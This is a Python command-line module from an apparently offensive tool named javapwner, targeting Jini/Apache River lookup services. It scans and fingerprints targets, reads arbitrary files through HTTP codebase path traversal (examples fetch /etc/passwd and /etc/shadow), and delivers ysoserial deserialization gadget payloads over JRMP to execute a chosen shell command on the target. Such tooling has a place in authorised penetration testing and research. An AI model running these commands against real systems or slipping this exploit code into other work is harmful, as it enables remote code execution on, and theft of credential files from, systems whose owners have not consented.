"""Click sub-commands for the Jini / Apache River module.

Commands:
  javapwner jini scan      -t HOST [-p PORT]    ← unified enumeration (all sources)
  javapwner jini read-file -t HOST [-p PORT] --path /etc/passwd
  javapwner jini exploit   -t HOST [-p PORT] --gadget NAME --cmd CMD
  javapwner jini admin     -t HOST [-p PORT]    ← Tier 2 Registrar admin inspection
  javapwner jini gadgets
"""

from __future__ import annotations

import sys

import click

from javapwner.core.output import OutputFormatter
from javapwner.exceptions import JavaPwnerError, JvmBridgeError, PayloadError
from javapwner.protocols.jini.assessment import assess_exploitation
from javapwner.protocols.jini.codebase import CodebaseExplorer
from javapwner.protocols.jini.enumerator import JiniEnumerator
from javapwner.protocols.jini.exploiter import JiniExploiter
from javapwner.protocols.jini.probe import JiniProbe
from javapwner.protocols.jini.scanner import JiniScanner

DEFAULT_PORT = 4160


def _get_fmt(ctx: click.Context) -> OutputFormatter:
    return ctx.obj["formatter"]


def _get_timeout(ctx: click.Context) -> float:
    return ctx.obj.get("timeout", 5.0)


def _get_ysoserial(ctx: click.Context) -> str | None:
    return ctx.obj.get("ysoserial_path")


def _scan_cmd_json(
    ctx: click.Context,
    fmt: OutputFormatter,
    target: str,
    port: int,
    timeout: float,
    no_codebase: bool,
    tier2: bool = False,
    jini_classpath: str | None = None,
) -> None:
    """JSON-mode path for scan_cmd — collects everything then emits one blob."""
    try:
        scanner = JiniScanner(timeout=timeout)
        scan_result = scanner.scan(target, port)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    try:
        enumerator = JiniEnumerator(timeout=timeout)
        enum_result = enumerator.enumerate(
            target, port,
            scan_result=scan_result,
            probe_codebase=not no_codebase,
        )
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    ep_result = None
    try:
        probe = JiniProbe(timeout=timeout)
        ep_result = probe.probe_endpoint(target, port, scan_result=scan_result)
    except JavaPwnerError:
        pass

    dgc_result = None
    try:
        probe = JiniProbe(timeout=timeout)
        dgc_result = probe.probe_dgc(target, port)
    except JavaPwnerError:
        pass

    assessment = assess_exploitation(
        version_hints=enum_result.java_version_hints,
        dgc_reachable=dgc_result.dgc_reachable if dgc_result else False,
        jep290_active=dgc_result.jep290_active if dgc_result else None,
        class_names=enum_result.extracted_classes,
        codebase_results=[e.to_dict() for e in enum_result.codebase_exploits],
        proxy_interfaces=enum_result.proxy_interfaces,
        registrar_info=enum_result.registrar_info,
        target=target,
        port=port,
    )

    out: dict = {
        "scan": scan_result.to_dict(),
        "enum": enum_result.to_dict(),
        "assessment": assessment.to_dict(),
    }
    if ep_result:
        out["probe_endpoint"] = ep_result.to_dict()
    if dgc_result:
        out["dgc_fingerprint"] = dgc_result.to_dict()
    fmt.print_json(out)


@click.group()
def jini() -> None:
    """Apache River / Jini protocol commands."""


# ---------------------------------------------------------------------------
# scan  — THE unified enumeration command
# ---------------------------------------------------------------------------

@jini.command("scan")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the Jini lookup service.")
@click.option("--no-codebase", is_flag=True, default=False,
              help="Skip HTTP codebase server exploitation.")
@click.option("--tier2", is_flag=True, default=False,
              help="Run Tier 2 active Registrar inspection via JVM bridge. "
                   "Requires JDK + Jini/River JARs.")
@click.option("--classpath", "jini_classpath", default=None, metavar="CP",
              help="Jini/River JAR classpath (colon-separated). "
                   "Also reads JINI_CLASSPATH env var.")
@click.pass_context
def scan_cmd(ctx: click.Context, target: str, port: int, no_codebase: bool,
             tier2: bool, jini_classpath: str | None) -> None:
    """Full Jini/Reggie enumeration — scan + enumerate + probe + codebase exploit.

    This is the main reconnaissance command.  It combines all enumeration
    sources into a single pass:

    \b
      1. TCP port probe + JRMP handshake + Unicast Discovery (v1/v2)
      2. Heuristic string/class/URL extraction from the serialised proxy
      3. Deep serial analysis (class descriptors, annotations, SUID, paths)
      4. Embedded JRMP endpoint detection and confirmation
      5. HTTP codebase server probing (directory listing, path traversal, file read)
      6. [--tier2] Active Registrar inspection via JVM bridge (admin, services)
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    # In JSON mode we must collect everything first and emit one atomic blob.
    if fmt.json_mode:
        _scan_cmd_json(ctx, fmt, target, port, timeout, no_codebase,
                       tier2=tier2, jini_classpath=jini_classpath)
        return

    # ── Phase 1: TCP + JRMP + Unicast Discovery ──────────────────────────────
    fmt.section("Phase 1 — Network Probe")
    try:
        scanner = JiniScanner(timeout=timeout)
        with fmt.status(f"Probing {target}:{port} (JRMP + Unicast Discovery)…"):
            scan_result = scanner.scan(target, port)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    # Print scan results immediately
    if scan_result.has_unicast_response:
        fmt.success(
            f"Jini Unicast Discovery v{scan_result.unicast_version} confirmed (Reggie)"
        )
    elif scan_result.is_jrmp:
        fmt.success("JRMP detected — Java RMI endpoint")
    else:
        fmt.warning("No Jini/JRMP response detected")

    if scan_result.jrmp_host or scan_result.jrmp_port:
        fmt.info(
            f"JRMP endpoint   : {scan_result.jrmp_host}:{scan_result.jrmp_port} "
            f"(version={scan_result.jrmp_version})"
        )
    if scan_result.groups:
        fmt.info(f"Groups          : {', '.join(scan_result.groups)}")
    if scan_result.udp_response:
        fmt.info("UDP multicast   : response received")

    if not scan_result.is_open:
        fmt.warning(f"Port {port} appears closed or filtered.")
        sys.exit(1)

    # ── Phase 2: Heuristic + deep serial analysis (no HTTP, fast) ────────────
    fmt.section("Phase 2 — Serialized Proxy Analysis")
    try:
        enumerator = JiniEnumerator(timeout=timeout)
        with fmt.status("Parsing serialised proxy stream…"):
            enum_result = enumerator.enumerate(
                target, port,
                scan_result=scan_result,
                probe_codebase=False,   # HTTP probing done per-URL in Phase 4
            )
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    # Print serial analysis results immediately
    if enum_result.potential_services:
        fmt.print_services_table(enum_result.potential_services)

    if enum_result.urls:
        fmt.info("URLs (TC_STRING):")
        for url in enum_result.urls:
            fmt.info(f"  {url}")

    if enum_result.codebase_urls:
        fmt.info("Codebase URLs (raw bytes):")
        for url in enum_result.codebase_urls:
            fmt.success(f"  {url}")

    if enum_result.class_descriptors:
        fmt.print_class_descriptors(enum_result.class_descriptors)

    if enum_result.class_annotations:
        fmt.info("Class annotations (codebase per class):")
        for annot in enum_result.class_annotations:
            fmt.info(
                f"  {annot.get('class_name', '?')} → {annot.get('annotation_url', '?')}"
            )

    if enum_result.proxy_interfaces:
        fmt.info("Proxy interfaces:")
        for iface in enum_result.proxy_interfaces:
            fmt.info(f"  {iface}")

    fmt.info(f"Nested streams  : {enum_result.nested_stream_count}")

    if enum_result.system_info:
        si = enum_result.system_info
        if si.get("hostnames") or si.get("file_paths") or si.get("java_properties"):
            fmt.info("System information extracted:")
            fmt.print_system_info(si)

    if enum_result.java_version_hints:
        disc = [h for h in enum_result.java_version_hints if h.get("discriminating") == "True"]
        pres = [h for h in enum_result.java_version_hints if h.get("discriminating") != "True"]
        if disc:
            fmt.info("Version-discriminating fingerprints:")
            for hint in disc:
                fmt.success(f"  {hint['class']}  SUID={hint['suid']} → {hint['hint']}")
        if pres and fmt.verbose:
            fmt.info("Presence confirmations (stable SUIDs — not version-discriminating):")
            for hint in pres:
                fmt.debug(f"  {hint['class']}  SUID={hint['suid']} → {hint['hint']}")

    if enum_result.embedded_endpoints:
        fmt.info(f"Embedded endpoints ({len(enum_result.embedded_endpoints)}):")
        for ep in enum_result.embedded_endpoints:
            fmt.info(f"  {ep['host']}:{ep['port']}")

    # Verbose: raw strings
    if fmt.verbose and enum_result.raw_strings:
        fmt.info("All extracted strings:")
        for s in enum_result.raw_strings:
            fmt.debug(f"  {s!r}")

    # ── Phase 3: JRMP endpoint confirmation ──────────────────────────────────
    fmt.section("Phase 3 — Endpoint Confirmation")
    ep_result = None
    try:
        probe = JiniProbe(timeout=timeout)
        with fmt.status("Confirming JRMP endpoints…"):
            ep_result = probe.probe_endpoint(target, port, scan_result=scan_result)
    except JavaPwnerError as exc:
        fmt.error(str(exc))

    if ep_result and ep_result.confirmed:
        fmt.success(
            f"Confirmed JRMP endpoint: "
            f"{ep_result.confirmed['host']}:{ep_result.confirmed['port']}"
        )
    elif ep_result and ep_result.candidates:
        fmt.info(f"Endpoint candidates (unconfirmed): {len(ep_result.candidates)}")
    else:
        fmt.info("No additional JRMP endpoints discovered.")

    # DGC fingerprint (harmless HashMap — no ysoserial needed)
    dgc_result = None
    try:
        probe = JiniProbe(timeout=timeout)
        with fmt.status("Probing DGC deserialization filters (JEP 290)…"):
            dgc_result = probe.probe_dgc(target, port)
        d = dgc_result.to_dict()
        status_str = d.get("status", "unknown")
        if dgc_result.jep290_active is False:
            fmt.success(f"DGC JEP 290   : {status_str}")
        elif dgc_result.jep290_active is True:
            fmt.warning(f"DGC JEP 290   : {status_str}")
        elif dgc_result.dgc_reachable:
            fmt.info(f"DGC JEP 290   : {status_str}")
        else:
            fmt.info(f"DGC JEP 290   : {status_str}")
    except JavaPwnerError:
        fmt.info("DGC JEP 290   : probe failed")

    # ── Phase 4: HTTP codebase exploitation (per-URL, progressive) ───────────
    codebase_exploits: list = []  # collect for assessment

    if no_codebase:
        fmt.info("Codebase probing skipped (--no-codebase).")
    else:
        fmt.section("Phase 4 — HTTP Codebase Exploitation")
        http_urls = enumerator.collect_codebase_http_urls(enum_result)

        if not http_urls:
            fmt.info("No HTTP codebase URLs found to probe.")
        else:
            for base_url in http_urls:
                fmt.info(f"Probing codebase server: {base_url}")

                def _progress_cb(msg: str, _url: str = base_url) -> None:  # noqa: ANN001
                    fmt.debug(f"  [{_url}] {msg}")

                explorer = CodebaseExplorer(timeout=timeout, progress_cb=_progress_cb)
                with fmt.status(f"Probing {base_url}…"):
                    exploit = explorer.explore(base_url)

                codebase_exploits.append(exploit)

                # Print this URL's results immediately
                fmt.print_codebase_exploit(exploit.to_dict())

                # Show downloaded class file analysis
                if exploit.downloaded_classes:
                    fmt.info(f"  Downloaded .class files ({len(exploit.downloaded_classes)}):")
                    for cls_info in exploit.downloaded_classes:
                        ifaces = ", ".join(cls_info.interfaces) if cls_info.interfaces else "(none)"
                        methods = ", ".join(cls_info.method_names[:10]) if cls_info.method_names else "(none)"
                        fmt.success(f"    {cls_info.class_name}")
                        fmt.info(f"      extends  : {cls_info.super_class}")
                        fmt.info(f"      implements: {ifaces}")
                        fmt.info(f"      methods  : {methods}")
                        if cls_info.field_names:
                            fmt.info(f"      fields   : {', '.join(cls_info.field_names[:10])}")

    # ── Phase 4b: Tier 2 — Active Registrar Inspection (optional) ──────────
    if tier2:
        fmt.section("Phase 4b — Tier 2: Active Registrar Inspection (JVM bridge)")
        try:
            from javapwner.core.jvm_bridge import JvmBridge

            cp_list = jini_classpath.split(":") if jini_classpath else None
            bridge = JvmBridge(classpath=cp_list, timeout=timeout + 25.0)

            # Pre-flight check
            issues = bridge.check_prerequisites()
            if issues:
                for issue in issues:
                    fmt.warning(issue)
                fmt.error("Tier 2 prerequisites not met — skipping.")
            else:
                with fmt.status("Connecting to Jini Lookup Service via JVM bridge…"):
                    reg_info = enumerator.enumerate_tier2(
                        target, port, bridge, enum_result,
                    )

                if reg_info.error:
                    fmt.warning(f"Tier 2 partial failure: {reg_info.error}")

                if reg_info.registrar_class:
                    fmt.success(f"Registrar class  : {reg_info.registrar_class}")
                if reg_info.service_id:
                    fmt.info(f"Service ID       : {reg_info.service_id}")
                if reg_info.groups:
                    fmt.info(f"Groups (JVM)     : {', '.join(reg_info.groups)}")
                if reg_info.locator:
                    fmt.info(f"Locator          : {reg_info.locator}")

                # Admin capabilities
                if reg_info.is_administrable:
                    fmt.success("Registrar IS Administrable — getAdmin() callable")
                    if reg_info.admin_class:
                        fmt.info(f"Admin class      : {reg_info.admin_class}")
                    for cap in reg_info.admin_capabilities:
                        marker = "[green][+][/green]" if cap.available else "[dim][-][/dim]"
                        fmt.console.print(f"  {marker} {cap.name} ({cap.interface})")
                        if cap.details:
                            for k, v in cap.details.items():
                                fmt.debug(f"      {k}: {v}")
                else:
                    fmt.info("Registrar is NOT Administrable")

                # Registered services
                if reg_info.services:
                    fmt.info(f"Registered services ({reg_info.total_services}):")
                    for svc in reg_info.services:
                        adm_tag = " [Administrable]" if svc.is_administrable else ""
                        fmt.info(f"  {svc.class_name}{adm_tag}")
                        if svc.interfaces and fmt.verbose:
                            for iface in svc.interfaces[:5]:
                                fmt.debug(f"    implements {iface}")
        except JvmBridgeError as exc:
            fmt.error(f"Tier 2 failed: {exc}")
        except JavaPwnerError as exc:
            fmt.error(f"Tier 2 error: {exc}")
    else:
        # Show heuristic admin hint if applicable
        if enum_result.registrar_info and enum_result.registrar_info.is_administrable:
            fmt.info(
                "Heuristic: Registrar appears Administrable. "
                "Use --tier2 for active inspection."
            )

    # ── Phase 5: Exploitation Assessment ────────────────────────────────────
    fmt.section("Phase 5 — Exploitation Assessment")

    # Collect DGC state from the Phase 3 probe
    _dgc_reachable = False
    _jep290_active: bool | None = None
    try:
        _dgc_reachable = dgc_result.dgc_reachable  # type: ignore[union-attr]
        _jep290_active = dgc_result.jep290_active  # type: ignore[union-attr]
    except AttributeError:
        pass

    assessment = assess_exploitation(
        version_hints=enum_result.java_version_hints,
        dgc_reachable=_dgc_reachable,
        jep290_active=_jep290_active,
        class_names=enum_result.extracted_classes,
        codebase_results=[e.to_dict() for e in codebase_exploits],
        proxy_interfaces=enum_result.proxy_interfaces,
        registrar_info=enum_result.registrar_info,
        target=target,
        port=port,
    )
    fmt.print_assessment(assessment.to_dict())

    # Hex dump at the very end
    if scan_result.raw_proxy_bytes:
        fmt.print_hex_dump(scan_result.raw_proxy_bytes, label="Raw proxy bytes")


# ---------------------------------------------------------------------------
# read-file  — targeted file reading through codebase HTTP server
# ---------------------------------------------------------------------------

@jini.command("read-file")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the Jini lookup service.")
@click.option("--path", "file_path", required=True, metavar="PATH",
              help="File path to read (e.g. /etc/passwd).")
@click.option("--codebase-url", default=None, metavar="URL",
              help="Codebase HTTP URL to use directly (skip auto-detection).")
@click.pass_context
def read_file_cmd(ctx: click.Context, target: str, port: int,
                  file_path: str, codebase_url: str | None) -> None:
    """Read an arbitrary file from the target via HTTP codebase path traversal.

    If --codebase-url is not given, the tool first performs a Jini Unicast
    Discovery to extract the codebase URL automatically.

    \b
    Examples:
      javapwner jini read-file -t 10.0.0.5 --path /etc/passwd
      javapwner jini read-file -t 10.0.0.5 --path /etc/shadow \\
                               --codebase-url http://10.0.0.5:8080/
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    # Resolve codebase URL
    if codebase_url:
        urls_to_try = [codebase_url]
    else:
        fmt.info(f"Auto-detecting codebase URL from {target}:{port} ...")
        try:
            enumerator = JiniEnumerator(timeout=timeout)
            enum_result = enumerator.enumerate(target, port, probe_codebase=False)
        except JavaPwnerError as exc:
            fmt.error(str(exc))
            sys.exit(1)

        # Collect HTTP base URLs
        urls_to_try = []
        seen: set[str] = set()
        for url in enum_result.codebase_urls:
            lower = url.lower()
            if lower.startswith("http://") or lower.startswith("https://"):
                base = _url_base(url)
                if base and base not in seen:
                    seen.add(base)
                    urls_to_try.append(base)

        for annot in enum_result.class_annotations:
            url = annot.get("annotation_url", "")
            if url:
                base = _url_base(url)
                if base and base not in seen:
                    seen.add(base)
                    urls_to_try.append(base)

        if not urls_to_try:
            fmt.error("No HTTP codebase URL found. Use --codebase-url to specify one.")
            sys.exit(1)

        fmt.info(f"Found {len(urls_to_try)} codebase URL(s) to try.")

    # Try each URL
    explorer = CodebaseExplorer(timeout=timeout)
    for base in urls_to_try:
        fmt.info(f"Trying {base} ...")
        result = explorer.read_file(base, file_path)

        if result.success:
            if fmt.json_mode:
                fmt.print_json(result.to_dict())
            else:
                fmt.success(f"File read successful via {base}")
                fmt.print_file_content(file_path, result.content_text, result.technique)
            return

    fmt.error(f"Could not read {file_path} through any codebase URL.")
    if not fmt.json_mode:
        fmt.warning("The server may not be vulnerable to path traversal.")
    sys.exit(1)


def _url_base(url: str) -> str | None:
    """Extract scheme+host+port+/ from a URL."""
    lower = url.lower()
    if not (lower.startswith("http://") or lower.startswith("https://")):
        return None
    after_scheme = url.find("//") + 2
    slash = url.find("/", after_scheme)
    if slash == -1:
        return url + "/"
    return url[:slash + 1]


# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------

@jini.command("exploit")
@click.option("-t", "--target", required=True, metavar="HOST")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int)
@click.option("--gadget", required=True, metavar="NAME",
              help="ysoserial gadget chain name (e.g. CommonsCollections6).")
@click.option("--cmd", "command", required=True, metavar="CMD",
              help="Shell command to execute on the target.")
@click.option("--jep290-probe", "jep290_probe", is_flag=True, default=False,
              help="Probe for JEP290 filters using URLDNS before exploiting.")
@click.option("--dns-url", default=None, metavar="URL",
              help="DNS callback URL for --jep290-probe (requires OOB listener).")
@click.pass_context
def exploit_cmd(ctx: click.Context, target: str, port: int, gadget: str,
                command: str, jep290_probe: bool, dns_url: str | None) -> None:
    """Deliver a ysoserial deserialization payload via JRMP DGC dirty call."""
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)
    jar = _get_ysoserial(ctx)

    try:
        exploiter = JiniExploiter(timeout=timeout, jar_path=jar)
    except PayloadError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    # Optional JEP290 probe
    if jep290_probe:
        if not dns_url:
            fmt.error("--dns-url is required when using --jep290-probe")
            sys.exit(1)
        fmt.info(f"Probing for JEP290 filters on {target}:{port} ...")
        no_filter = exploiter.probe_jep290(target, port, dns_url)
        if no_filter:
            fmt.success("JEP290 probe: no serialization filter detected.")
        else:
            fmt.warning("JEP290 probe: filter detected — exploitation may fail.")

    fmt.info(f"Exploiting {target}:{port} with gadget '{gadget}' → {command!r}")

    result = exploiter.exploit(target, port, gadget, command)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if result.error:
        fmt.error(f"Exploit failed: {result.error}")
        sys.exit(1)

    if result.likely_success:
        fmt.success("Payload delivered — no exception in response (likely executed).")
    elif result.exception_in_response:
        fmt.warning("TC_EXCEPTION in response — payload may have been filtered (JEP290?).")
    elif result.sent:
        fmt.info("Payload sent — no response received (blind execution).")
    else:
        fmt.error("Payload was not sent.")

    if fmt.verbose:
        fmt.print_hex_dump(result.response_bytes, label="Server response")


# ---------------------------------------------------------------------------
# gadgets
# ---------------------------------------------------------------------------

@jini.command("gadgets")
@click.pass_context
def gadgets_cmd(ctx: click.Context) -> None:
    """List available ysoserial gadget chains."""
    fmt = _get_fmt(ctx)
    jar = _get_ysoserial(ctx)

    try:
        from javapwner.core.payload import YsoserialWrapper
        wrapper = YsoserialWrapper(jar_path=jar)
        gadgets = wrapper.list_gadgets()
    except PayloadError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json({"gadgets": gadgets})
        return

    if not gadgets:
        fmt.warning("No gadgets found — check ysoserial.jar version.")
        return

    fmt.success(f"Available gadgets ({len(gadgets)}):")
    for g in gadgets:
        fmt.info(f"  {g}")


# ---------------------------------------------------------------------------
# admin  — Tier 2 Registrar admin inspection
# ---------------------------------------------------------------------------

@jini.command("admin")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the Jini lookup service.")
@click.option("--classpath", "jini_classpath", default=None, metavar="CP",
              help="Jini/River JAR classpath (colon-separated).")
@click.option("--action", type=click.Choice(["check", "list-services"]),
              default="check", show_default=True,
              help="Action to perform: 'check' inspects admin capabilities, "
                   "'list-services' enumerates registered services.")
@click.pass_context
def admin_cmd(ctx: click.Context, target: str, port: int,
              jini_classpath: str | None, action: str) -> None:
    """Inspect Jini Registrar administration interfaces (Tier 2).

    \b
    Requires:
      - A JDK (java + javac on PATH, or JAVA_HOME set)
      - Jini/River JARs (in lib/, or via --classpath / JINI_CLASSPATH)

    \b
    Examples:
      javapwner jini admin -t 10.0.0.5
      javapwner jini admin -t 10.0.0.5 --action list-services
      javapwner jini admin -t 10.0.0.5 --classpath /opt/river/lib/jsk-lib.jar
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    try:
        from javapwner.core.jvm_bridge import JvmBridge
        from javapwner.protocols.jini.registrar import RegistrarInspector

        cp_list = jini_classpath.split(":") if jini_classpath else None
        bridge = JvmBridge(classpath=cp_list, timeout=timeout + 25.0)

        # Pre-flight check
        issues = bridge.check_prerequisites()
        if issues:
            for issue in issues:
                fmt.error(issue)
            fmt.error(
                "Tier 2 prerequisites not met.  See README for setup instructions."
            )
            sys.exit(1)

        inspector = RegistrarInspector(bridge)
        fmt.info(f"Connecting to {target}:{port} via JVM bridge…")

        with fmt.status(f"Inspecting Registrar at {target}:{port}…"):
            info = inspector.inspect(target, port, timeout_ms=int(timeout * 1000))

    except JvmBridgeError as exc:
        fmt.error(str(exc))
        sys.exit(1)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(info.to_dict())
        return

    if info.error:
        fmt.error(f"Inspection error: {info.error}")
        if not info.registrar_class:
            sys.exit(1)

    # ── Registrar metadata ────────────────────────────────────────────
    fmt.section("Registrar")
    fmt.success(f"Class            : {info.registrar_class}")
    if info.service_id:
        fmt.info(f"Service ID       : {info.service_id}")
    if info.groups:
        fmt.info(f"Groups           : {', '.join(info.groups)}")
    if info.locator:
        fmt.info(f"Locator          : {info.locator}")
    if info.registrar_interfaces:
        fmt.info("Interfaces:")
        for iface in info.registrar_interfaces:
            fmt.info(f"  {iface}")

    # ── Admin capabilities ────────────────────────────────────────────
    fmt.section("Administration")
    if info.is_administrable:
        fmt.success("Registrar IS Administrable — getAdmin() succeeded")
        if info.admin_class:
            fmt.info(f"Admin class      : {info.admin_class}")
        if info.admin_interfaces:
            fmt.info("Admin interfaces:")
            for iface in info.admin_interfaces:
                fmt.info(f"  {iface}")

        if info.admin_capabilities:
            fmt.info("Capabilities:")
            for cap in info.admin_capabilities:
                if cap.available:
                    fmt.success(f"  {cap.name} ({cap.interface})")
                else:
                    fmt.info(f"  {cap.name} — not available")
                for k, v in cap.details.items():
                    fmt.info(f"    {k}: {v}")
        else:
            fmt.warning("No specific admin capabilities identified.")
    else:
        fmt.info("Registrar is NOT Administrable.")

    # ── Services ──────────────────────────────────────────────────────
    if action == "list-services" or info.services:
        fmt.section(f"Registered Services ({info.total_services})")
        if not info.services:
            fmt.info("No services found (or lookup failed).")
        else:
            for svc in info.services:
                adm = " [Administrable]" if svc.is_administrable else ""
                fmt.info(f"  {svc.service_id}  {svc.class_name}{adm}")
                if fmt.verbose and svc.interfaces:
                    for iface in svc.interfaces[:8]:
                        fmt.debug(f"    implements {iface}")
                if svc.attributes:
                    for attr in svc.attributes[:5]:
                        fmt.debug(f"    attr: {attr}")


# ---------------------------------------------------------------------------
# multicast  — active multicast discovery (send request, collect responses)
# ---------------------------------------------------------------------------

@jini.command("multicast")
@click.option("--group", "groups", multiple=True, metavar="GROUP",
              help="Discovery group to announce (repeatable). Default: public group.")
@click.option("--wait", default=3.0, show_default=True, type=float,
              metavar="SECS", help="Seconds to collect multicast responses.")
@click.pass_context
def multicast_cmd(ctx: click.Context, groups: tuple[str, ...], wait: float) -> None:
    """Send a Jini Multicast Discovery Request and collect Reggie responses.

    Sends a UDP multicast to the Jini well-known group (224.0.1.85:4160)
    and starts a temporary TCP callback server to receive unicast responses
    from any Jini Lookup Services on the local network.

    \b
    Examples:
      javapwner jini multicast
      javapwner jini multicast --group public --wait 5
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    groups_list = list(groups) if groups else None

    fmt.info(f"Sending Multicast Discovery Request (wait={wait}s)…")
    try:
        scanner = JiniScanner(timeout=timeout)
        result = scanner.multicast_discover(groups=groups_list, wait=wait)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if not result.sent:
        fmt.error(f"Failed to send multicast: {result.error}")
        sys.exit(1)

    fmt.success("Multicast request sent.")
    if not result.responders:
        fmt.info("No responses received within the wait window.")
        return

    fmt.success(f"Received {len(result.responders)} response(s):")
    for resp in result.responders:
        host = resp.get("host", "?")
        port = resp.get("port", "?")
        grps = resp.get("groups", [])
        fmt.info(f"  {host}:{port}  groups={grps}")
